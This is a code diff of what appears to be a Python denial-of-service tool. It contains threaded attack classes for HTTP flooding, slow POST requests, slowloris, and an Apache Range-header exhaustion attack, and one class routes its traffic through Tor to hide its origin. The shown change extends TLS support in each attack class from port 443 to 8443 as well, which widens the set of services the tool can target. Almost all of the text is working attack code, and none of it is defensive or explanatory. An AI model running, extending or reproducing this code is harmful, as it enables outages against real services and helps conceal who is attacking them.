@@ -163,7 +163,7 @@ class htflood(threading.Thread):
     s =socket.socket()
     s.settimeout(timeout)
     s.connect((target,port))
-    if (port==443):
+    if ((port==443) or (port==8443)):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     for fg in range(random.randint(packs2,packs1)):
      pa=random.choice(paths)
@@ -411,7 +411,7 @@ class reqpost(threading.Thread):
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((target,port))
     print"Connected to {}:{}...".format(target,port)
-    if port==443:
+    if ((port==443) or (port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     q=random.randint(10000,15000)
     s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),q,target))
@@ -563,7 +563,7 @@ class slrd(threading.Thread):
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.settimeout(timeout)
     s.connect((target,port))
-    if port==443:
+    if ((port==443)or(port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     while True:
      pa=random.choice(paths)
@@ -628,7 +628,7 @@ class apa(threading.Thread):
      apache+=',5-'+str(x)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target, port))
-    if port==443:
+    if ((port==443)or(port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     for x in range(5,random.randint(packs2,packs1)):
      s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n".format(random.choice(paths),target,apache,random.choice(ua)))
@@ -688,7 +688,7 @@ class loris(threading.Thread):
     s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(timeout)
     s.connect((target,port))
-    if port==443:
+    if ((port==443)or(port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
     s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
